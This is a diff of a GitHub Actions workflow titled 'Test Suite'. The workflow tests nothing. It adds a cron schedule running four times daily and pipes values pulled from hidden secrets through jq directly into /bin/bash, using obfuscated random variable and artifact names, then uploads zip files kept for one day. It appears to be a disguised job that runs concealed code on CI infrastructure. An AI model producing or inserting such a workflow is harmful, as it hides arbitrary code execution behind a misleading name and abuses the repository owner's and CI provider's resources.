@@ -2,6 +2,8 @@ name: Test Suite
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '24 2,8,14,20 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,17 +16,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: Start
         env:
-          csp55024: ${{ secrets.csp55024 }}
+          dhx10726: ${{ secrets.dhx10726 }}
         run: |
-          printf '%s' "$csp55024" | jq -r .bjvln061 | /bin/bash
-          printf '%s' "$kc19" | jq -r .to59513 | /bin/bash
-          printf '%s' "$vxo2203" | jq -r .trimd66913 | /bin/bash
-          printf '%s' "$iylx411" | jq -r .xofor44868 | /bin/bash
-          printf '%s' "$inloi061" | jq -r .je9 | /bin/bash
+          printf '%s' "$dhx10726" | jq -r .wtavo78847 | /bin/bash
+          echo $veff5057 | jq -r .fe6 | /bin/bash
+          printf '%s' "$mk34562" | jq -r .f17391 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
         with:
-          name: 3pUFB8y4
+          name: mPZl6YhI
           path: "*.zip"
           retention-days: 1
